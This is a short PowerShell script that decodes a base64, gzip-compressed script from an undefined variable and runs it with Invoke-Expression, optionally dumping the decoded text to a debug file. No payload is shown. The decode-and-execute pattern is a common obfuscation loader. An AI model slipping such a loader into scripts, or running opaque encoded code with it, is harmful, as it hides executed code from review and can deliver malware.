$CompressedBytes = [Convert]::FromBase64String($EncodedScript)

$MemoryStream = New-Object System.IO.MemoryStream(,$CompressedBytes)
$GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)

$OutputStream = New-Object System.IO.MemoryStream
$GzipStream.CopyTo($OutputStream)

$DecompressedBytes = $OutputStream.ToArray()
$data = [System.Text.Encoding]::UTF8.GetString($DecompressedBytes)

$sb = New-Object System.Text.StringBuilder
[void]$sb.Append($data)

$DecodedScript = $sb.ToString()


function IsLocalDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

if (IsLocalDebug)
{
    try
    {
        $outFile = "C:\debug-decoded.ps1"
        [System.IO.File]::WriteAllText($outFile, $DecodedScript)
    } 
    catch 
    {
    }
}


Invoke-Expression $DecodedScript